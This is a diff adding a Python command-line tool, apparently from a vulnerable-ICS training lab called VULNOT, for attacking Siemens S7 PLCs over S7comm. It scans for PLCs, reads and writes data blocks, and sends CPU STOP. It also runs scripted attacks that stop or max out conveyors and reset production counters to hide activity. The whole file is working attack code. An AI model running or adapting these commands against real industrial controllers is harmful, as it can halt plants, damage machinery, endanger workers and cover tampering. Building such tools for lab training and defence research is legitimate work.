@@ -1,0 +1,601 @@
+#!/usr/bin/env python3
+"""
+VULNOT S7comm Attack Tools
+Tools for attacking Siemens S7 PLCs
+"""
+
+import argparse
+import socket
+import struct
+import sys
+import time
+from typing import Optional, List, Dict, Any
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.prompt import Confirm
+
+console = Console()
+
+# S7 Constants
+TPKT_HEADER = b'\x03\x00'
+COTP_CONNECT = 0xE0
+COTP_DATA = 0xF0
+S7_PROTOCOL_ID = 0x32
+
+# S7 Function codes
+S7_READ_VAR = 0x04
+S7_WRITE_VAR = 0x05
+S7_SETUP_COMM = 0xF0
+S7_CPU_STOP = 0x29
+S7_CPU_START = 0x28
+
+# Data types
+S7_BYTE = 0x02
+S7_WORD = 0x04
+S7_DWORD = 0x06
+S7_REAL = 0x08
+
+# Area codes
+S7_AREA_DB = 0x84
+S7_AREA_MK = 0x83
+S7_AREA_PE = 0x81
+S7_AREA_PA = 0x82
+S7_AREA_CT = 0x1C
+S7_AREA_TM = 0x1D
+
+# DB mappings for factory scenario
+DB1_MAPPING = {
+    0: ("conv1_speed", "REAL", "Conveyor 1 Speed %"),
+    4: ("conv2_speed", "REAL", "Conveyor 2 Speed %"),
+    8: ("conv3_speed", "REAL", "Conveyor 3 Speed %"),
+    12: ("shift_target", "INT", "Shift Target"),
+    14: ("current_shift", "INT", "Current Shift"),
+    16: ("robot1_cycle_time", "REAL", "Robot 1 Cycle Time"),
+    20: ("robot2_cycle_time", "REAL", "Robot 2 Cycle Time"),
+}
+
+DB2_MAPPING = {
+    0: ("parts_produced", "DINT", "Total Parts Produced"),
+    4: ("parts_good", "DINT", "Good Parts"),
+    8: ("parts_rejected", "DINT", "Rejected Parts"),
+    12: ("robot1_parts_handled", "DINT", "Robot 1 Parts"),
+    16: ("robot2_parts_handled", "DINT", "Robot 2 Parts"),
+    20: ("pkg_boxes_completed", "INT", "Boxes Completed"),
+}
+
+DB4_MAPPING = {
+    0: ("conv1_motor_current", "REAL", "Conv 1 Current (A)"),
+    4: ("conv2_motor_current", "REAL", "Conv 2 Current (A)"),
+    8: ("conv3_motor_current", "REAL", "Conv 3 Current (A)"),
+    12: ("robot1_servo_temp", "REAL", "Robot 1 Temp (°C)"),
+    16: ("robot2_servo_temp", "REAL", "Robot 2 Temp (°C)"),
+    20: ("ambient_temp", "REAL", "Ambient Temp (°C)"),
+    24: ("compressed_air_pressure", "REAL", "Air Pressure (bar)"),
+    28: ("qc_pass_rate", "REAL", "QC Pass Rate (%)"),
+}
+
+
+class S7Client:
+    """Simple S7comm client"""
+    
+    def __init__(self, host: str, port: int = 102, rack: int = 0, slot: int = 1):
+        self.host = host
+        self.port = port
+        self.rack = rack
+        self.slot = slot
+        self.sock: Optional[socket.socket] = None
+        self.pdu_length = 480
+        
+    def connect(self) -> bool:
+        """Connect to S7 PLC"""
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.settimeout(5)
+            self.sock.connect((self.host, self.port))
+            
+            # COTP connection request
+            cotp_cr = bytes([
+                0x11,  # Length
+                0xE0,  # CR (Connection Request)
+                0x00, 0x00,  # Dest ref
+                0x00, 0x01,  # Src ref
+                0x00,  # Class
+                0xC0, 0x01, 0x0A,  # TPDU size
+                0xC1, 0x02, 0x01, 0x00,  # Src TSAP
+                0xC2, 0x02, 0x01, (self.rack * 32 + self.slot),  # Dst TSAP
+            ])
+            
+            tpkt = TPKT_HEADER + struct.pack('>H', len(cotp_cr) + 4)
+            self.sock.send(tpkt + cotp_cr)
+            
+            # Receive CC
+            response = self.sock.recv(1024)
+            if len(response) < 7 or response[5] != 0xD0:
+                return False
+            
+            # S7 setup communication
+            s7_setup = bytes([
+                0x32,  # Protocol ID
+                0x01,  # Job
+                0x00, 0x00,  # Reserved
+                0x00, 0x00,  # PDU ref
+                0x00, 0x08,  # Param length
+                0x00, 0x00,  # Data length
+                0xF0,  # Setup comm
+                0x00,  # Reserved
+                0x00, 0x01,  # Max AMQ calling
+                0x00, 0x01,  # Max AMQ called
+                0x01, 0xE0,  # PDU length
+            ])
+            
+            cotp_dt = bytes([0x02, 0xF0, 0x80])
+            tpkt = TPKT_HEADER + struct.pack('>H', len(cotp_dt) + len(s7_setup) + 4)
+            self.sock.send(tpkt + cotp_dt + s7_setup)
+            
+            response = self.sock.recv(1024)
+            return len(response) > 10
+            
+        except Exception as e:
+            console.print(f"[red]Connection failed: {e}[/]")
+            return False
+            
+    def close(self):
+        if self.sock:
+            self.sock.close()
+            
+    def read_db(self, db_number: int, start: int, size: int) -> Optional[bytes]:
+        """Read from a data block"""
+        # Build read request
+        item = bytes([
+            0x12,  # Spec type
+            0x0A,  # Length
+            0x10,  # Syntax ID
+            S7_BYTE,  # Transport size
+            (size >> 8) & 0xFF, size & 0xFF,  # Length
+            (db_number >> 8) & 0xFF, db_number & 0xFF,  # DB number
+            S7_AREA_DB,  # Area
+            (start >> 16) & 0xFF, (start >> 8) & 0xFF, (start << 3) & 0xFF,  # Address
+        ])
+        
+        s7_header = bytes([
+            0x32,  # Protocol ID
+            0x01,  # Job
+            0x00, 0x00,  # Reserved
+            0x00, 0x00,  # PDU ref
+            0x00, 0x0E,  # Param length
+            0x00, 0x00,  # Data length
+            S7_READ_VAR,  # Function
+            0x01,  # Item count
+        ]) + item
+        
+        cotp_dt = bytes([0x02, 0xF0, 0x80])
+        tpkt = TPKT_HEADER + struct.pack('>H', len(cotp_dt) + len(s7_header) + 4)
+        
+        try:
+            self.sock.send(tpkt + cotp_dt + s7_header)
+            response = self.sock.recv(1024)
+            
+            if len(response) > 25:
+                # Extract data from response
+                return_code = response[21]
+                if return_code == 0xFF:  # Success
+                    data_length = struct.unpack('>H', response[23:25])[0] // 8
+                    return response[25:25 + data_length]
+                    
+        except Exception as e:
+            console.print(f"[red]Read error: {e}[/]")
+            
+        return None
+        
+    def write_db(self, db_number: int, start: int, data: bytes) -> bool:
+        """Write to a data block"""
+        size = len(data)
+        
+        # Build write request
+        item = bytes([
+            0x12,  # Spec type
+            0x0A,  # Length
+            0x10,  # Syntax ID
+            S7_BYTE,  # Transport size
+            (size >> 8) & 0xFF, size & 0xFF,  # Length
+            (db_number >> 8) & 0xFF, db_number & 0xFF,  # DB number
+            S7_AREA_DB,  # Area
+            (start >> 16) & 0xFF, (start >> 8) & 0xFF, (start << 3) & 0xFF,  # Address
+        ])
+        
+        data_item = bytes([
+            0x00,  # Return code
+            0x04,  # Transport size (byte)
+            (size * 8 >> 8) & 0xFF, (size * 8) & 0xFF,  # Length in bits
+        ]) + data
+        
+        param_length = 2 + len(item)
+        data_length = len(data_item)
+        
+        s7_header = bytes([
+            0x32,  # Protocol ID
+            0x01,  # Job
+            0x00, 0x00,  # Reserved
+            0x00, 0x00,  # PDU ref
+            (param_length >> 8) & 0xFF, param_length & 0xFF,
+            (data_length >> 8) & 0xFF, data_length & 0xFF,
+            S7_WRITE_VAR,  # Function
+            0x01,  # Item count
+        ]) + item + data_item
+        
+        cotp_dt = bytes([0x02, 0xF0, 0x80])
+        tpkt = TPKT_HEADER + struct.pack('>H', len(cotp_dt) + len(s7_header) + 4)
+        
+        try:
+            self.sock.send(tpkt + cotp_dt + s7_header)
+            response = self.sock.recv(1024)
+            return len(response) > 20 and response[21] == 0xFF
+        except:
+            return False
+            
+    def cpu_stop(self) -> bool:
+        """Send CPU STOP command"""
+        s7_stop = bytes([
+            0x32, 0x01, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x10, 0x00, 0x00,
+            S7_CPU_STOP,  # Function
+            0x00, 0x00, 0x00, 0x00, 0x00,
+            0x09, 0x50, 0x5F, 0x50, 0x52, 0x4F, 0x47, 0x52, 0x41, 0x4D,  # P_PROGRAM
+        ])
+        
+        cotp_dt = bytes([0x02, 0xF0, 0x80])
+        tpkt = TPKT_HEADER + struct.pack('>H', len(cotp_dt) + len(s7_stop) + 4)
+        
+        try:
+            self.sock.send(tpkt + cotp_dt + s7_stop)
+            response = self.sock.recv(1024)
+            return len(response) > 10
+        except:
+            return False
+
+
+def cmd_scan(args):
+    """Scan for S7 PLCs"""
+    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
+    console.print("[bold cyan]║      VULNOT S7comm Device Scanner      ║[/]")
+    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
+    
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    
+    def check_host(ip):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            result = sock.connect_ex((ip, args.port))
+            sock.close()
+            if result == 0:
+                return ip
+        except:
+            pass
+        return None
+    
+    if '/' in args.network:
+        base = args.network.split('/')[0]
+        prefix = base.rsplit('.', 1)[0]
+        hosts = [f"{prefix}.{i}" for i in range(1, 255)]
+    else:
+        hosts = [args.network]
+    
+    console.print(f"[yellow]Scanning {len(hosts)} hosts on port {args.port}...[/]\n")
+    
+    found = []
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        futures = {executor.submit(check_host, ip): ip for ip in hosts}
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                found.append(result)
+    
+    if found:
+        table = Table(title="Discovered S7 PLCs")
+        table.add_column("IP Address", style="cyan")
+        table.add_column("Port", style="green")
+        table.add_column("Status", style="yellow")
+        
+        for ip in sorted(found):
+            table.add_row(ip, str(args.port), "S7 Port Open")
+        
+        console.print(table)
+        console.print(f"\n[green]Found {len(found)} S7 device(s)[/]\n")
+    else:
+        console.print("[red]No S7 devices found[/]\n")
+
+
+def cmd_read(args):
+    """Read data blocks from S7 PLC"""
+    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
+    console.print("[bold cyan]║      VULNOT S7comm Data Block Reader   ║[/]")
+    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(f"[yellow]Connecting to {args.target}:{args.port} (Rack {args.rack}, Slot {args.slot})...[/]")
+    
+    client = S7Client(args.target, args.port, args.rack, args.slot)
+    if not client.connect():
+        sys.exit(1)
+    
+    console.print("[green]Connected![/]\n")
+    
+    db_mappings = {
+        1: ("Setpoints", DB1_MAPPING),
+        2: ("Counters", DB2_MAPPING),
+        4: ("Analog Values", DB4_MAPPING),
+    }
+    
+    if args.db in db_mappings:
+        db_name, mapping = db_mappings[args.db]
+        
+        # Read data block
+        data = client.read_db(args.db, 0, 32)
+        
+        table = Table(title=f"DB{args.db} - {db_name}")
+        table.add_column("Offset", style="cyan")
+        table.add_column("Name", style="white")
+        table.add_column("Type", style="yellow")
+        table.add_column("Value", style="green")
+        
+        if data:
+            for offset, (attr, dtype, desc) in mapping.items():
+                if offset + 4 <= len(data):
+                    if dtype == "REAL":
+                        value = struct.unpack('>f', data[offset:offset+4])[0]
+                        table.add_row(str(offset), desc, dtype, f"{value:.2f}")
+                    elif dtype == "DINT":
+                        value = struct.unpack('>i', data[offset:offset+4])[0]
+                        table.add_row(str(offset), desc, dtype, str(value))
+                    elif dtype == "INT":
+                        value = struct.unpack('>h', data[offset:offset+2])[0]
+                        table.add_row(str(offset), desc, dtype, str(value))
+        
+        console.print(table)
+    else:
+        # Raw read
+        data = client.read_db(args.db, 0, args.size)
+        if data:
+            console.print(f"[cyan]DB{args.db} Raw Data ({len(data)} bytes):[/]")
+            console.print(data.hex())
+    
+    client.close()
+    console.print("\n[dim]Connection closed[/]\n")
+
+
+def cmd_write(args):
+    """Write to S7 PLC data block"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT S7comm Data Block Writer   ║[/]")
+    console.print("[bold red]║   ⚠️  DANGER - MODIFIES PLC MEMORY      ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(f"[yellow]Target: {args.target}:{args.port}[/]")
+    console.print(f"[yellow]DB{args.db}.DBD{args.offset} = {args.value}[/]\n")
+    
+    if not args.force:
+        if not Confirm.ask("[bold red]Execute write operation?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = S7Client(args.target, args.port, args.rack, args.slot)
+    if not client.connect():
+        sys.exit(1)
+    
+    # Pack value based on type
+    if args.type == 'real':
+        data = struct.pack('>f', args.value)
+    elif args.type == 'dint':
+        data = struct.pack('>i', int(args.value))
+    elif args.type == 'int':
+        data = struct.pack('>h', int(args.value))
+    else:
+        data = struct.pack('>f', args.value)
+    
+    success = client.write_db(args.db, args.offset, data)
+    
+    if success:
+        console.print(f"\n[green]✓ Successfully wrote {args.value} to DB{args.db}.DBD{args.offset}[/]")
+    else:
+        console.print(f"\n[red]✗ Write failed[/]")
+    
+    client.close()
+
+
+def cmd_stop(args):
+    """Send CPU STOP command"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT S7comm CPU STOP Attack     ║[/]")
+    console.print("[bold red]║   ⚠️  EXTREME DANGER - STOPS PLC        ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(Panel(
+        f"[bold red]This will STOP the PLC CPU at {args.target}![/]\n\n"
+        "A CPU STOP will cause:\n"
+        "• All outputs go to safe state\n"
+        "• Production line halts immediately\n"
+        "• Robots stop mid-motion\n"
+        "• Conveyors stop",
+        title="⚠️  CPU STOP COMMAND",
+        border_style="red"
+    ))
+    
+    if not args.force:
+        if not Confirm.ask("\n[bold red]Send CPU STOP command?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = S7Client(args.target, args.port, args.rack, args.slot)
+    if not client.connect():
+        sys.exit(1)
+    
+    success = client.cpu_stop()
+    
+    if success:
+        console.print(f"\n[red]✓ CPU STOP command sent![/]")
+        console.print("[yellow]PLC should be in STOP mode now.[/]")
+    else:
+        console.print(f"\n[red]✗ CPU STOP command failed (may require password)[/]")
+    
+    client.close()
+
+
+def cmd_scenario(args):
+    """Execute predefined attack scenario"""
+    scenarios = {
+        'estop': {
+            'name': 'Emergency Stop Attack',
+            'description': 'Trigger E-Stop to halt production',
+            'actions': [
+                ('write', 1, 0, 0.0, 'real', 'Set conv1_speed to 0'),
+                ('write', 1, 4, 0.0, 'real', 'Set conv2_speed to 0'),
+                ('write', 1, 8, 0.0, 'real', 'Set conv3_speed to 0'),
+            ]
+        },
+        'speedup': {
+            'name': 'Conveyor Speedup Attack',
+            'description': 'Max out conveyor speeds to cause jams',
+            'actions': [
+                ('write', 1, 0, 100.0, 'real', 'Max conv1_speed'),
+                ('write', 1, 4, 100.0, 'real', 'Max conv2_speed'),
+                ('write', 1, 8, 100.0, 'real', 'Max conv3_speed'),
+            ]
+        },
+        'counter_reset': {
+            'name': 'Counter Reset Attack',
+            'description': 'Reset production counters to hide activity',
+            'actions': [
+                ('write', 2, 0, 0, 'dint', 'Reset parts_produced'),
+                ('write', 2, 4, 0, 'dint', 'Reset parts_good'),
+                ('write', 2, 8, 0, 'dint', 'Reset parts_rejected'),
+            ]
+        },
+    }
+    
+    if args.scenario not in scenarios:
+        console.print(f"[red]Unknown scenario: {args.scenario}[/]")
+        console.print(f"Available: {', '.join(scenarios.keys())}")
+        return
+    
+    scenario = scenarios[args.scenario]
+    
+    console.print(Panel(
+        f"[bold red]{scenario['name']}[/]\n\n{scenario['description']}",
+        title="⚠️  ATTACK SCENARIO",
+        border_style="red"
+    ))
+    
+    console.print("\n[yellow]Actions to execute:[/]")
+    for action in scenario['actions']:
+        console.print(f"  • {action[5]}")
+    
+    if not args.force:
+        if not Confirm.ask("\n[bold red]Execute attack scenario?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = S7Client(args.target, args.port, args.rack, args.slot)
+    if not client.connect():
+        sys.exit(1)
+    
+    console.print("\n[red]Executing attack...[/]\n")
+    
+    for action in scenario['actions']:
+        _, db, offset, value, dtype, desc = action
+        
+        if dtype == 'real':
+            data = struct.pack('>f', value)
+        elif dtype == 'dint':
+            data = struct.pack('>i', int(value))
+        elif dtype == 'int':
+            data = struct.pack('>h', int(value))
+        else:
+            data = struct.pack('>f', value)
+        
+        success = client.write_db(db, offset, data)
+        status = "[green]✓[/]" if success else "[red]✗[/]"
+        console.print(f"  {status} {desc}")
+    
+    client.close()
+    console.print("\n[red bold]Attack complete![/]")
+    console.print("[dim]Monitor the HMI dashboard to observe impact[/]\n")
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='VULNOT S7comm Attack Tools',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  vulnot-s7 scan -n 10.0.3.0/24
+  vulnot-s7 read -t 10.0.3.10 -d 1
+  vulnot-s7 write -t 10.0.3.10 -d 1 -o 0 -v 0 --type real
+  vulnot-s7 stop -t 10.0.3.10
+  vulnot-s7 scenario -t 10.0.3.10 -s estop
+        """
+    )
+    
+    subparsers = parser.add_subparsers(dest='command', help='Command')
+    
+    # Scan
+    scan_p = subparsers.add_parser('scan', help='Scan for S7 PLCs')
+    scan_p.add_argument('-n', '--network', default='10.0.3.0/24', help='Network')
+    scan_p.add_argument('-p', '--port', type=int, default=102, help='Port')
+    
+    # Read
+    read_p = subparsers.add_parser('read', help='Read data blocks')
+    read_p.add_argument('-t', '--target', required=True, help='Target IP')
+    read_p.add_argument('-p', '--port', type=int, default=102, help='Port')
+    read_p.add_argument('-r', '--rack', type=int, default=0, help='Rack')
+    read_p.add_argument('-s', '--slot', type=int, default=1, help='Slot')
+    read_p.add_argument('-d', '--db', type=int, default=1, help='DB number')
+    read_p.add_argument('--size', type=int, default=32, help='Read size')
+    
+    # Write
+    write_p = subparsers.add_parser('write', help='Write to data blocks')
+    write_p.add_argument('-t', '--target', required=True, help='Target IP')
+    write_p.add_argument('-p', '--port', type=int, default=102, help='Port')
+    write_p.add_argument('-r', '--rack', type=int, default=0, help='Rack')
+    write_p.add_argument('-s', '--slot', type=int, default=1, help='Slot')
+    write_p.add_argument('-d', '--db', type=int, required=True, help='DB number')
+    write_p.add_argument('-o', '--offset', type=int, required=True, help='Offset')
+    write_p.add_argument('-v', '--value', type=float, required=True, help='Value')
+    write_p.add_argument('--type', choices=['real', 'dint', 'int'], default='real')
+    write_p.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    # Stop
+    stop_p = subparsers.add_parser('stop', help='Send CPU STOP')
+    stop_p.add_argument('-t', '--target', required=True, help='Target IP')
+    stop_p.add_argument('-p', '--port', type=int, default=102, help='Port')
+    stop_p.add_argument('-r', '--rack', type=int, default=0, help='Rack')
+    stop_p.add_argument('-s', '--slot', type=int, default=1, help='Slot')
+    stop_p.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    # Scenario
+    scen_p = subparsers.add_parser('scenario', help='Execute attack scenario')
+    scen_p.add_argument('-t', '--target', required=True, help='Target IP')
+    scen_p.add_argument('-p', '--port', type=int, default=102, help='Port')
+    scen_p.add_argument('-r', '--rack', type=int, default=0, help='Rack')
+    scen_p.add_argument('-s', '--slot', type=int, default=1, help='Slot')
+    scen_p.add_argument('--scenario', required=True, choices=['estop', 'speedup', 'counter_reset'])
+    scen_p.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    args = parser.parse_args()
+    
+    if args.command == 'scan':
+        cmd_scan(args)
+    elif args.command == 'read':
+        cmd_read(args)
+    elif args.command == 'write':
+        cmd_write(args)
+    elif args.command == 'stop':
+        cmd_stop(args)
+    elif args.command == 'scenario':
+        cmd_scenario(args)
+    else:
+        parser.print_help()
+
+
+if __name__ == '__main__':
+    main()
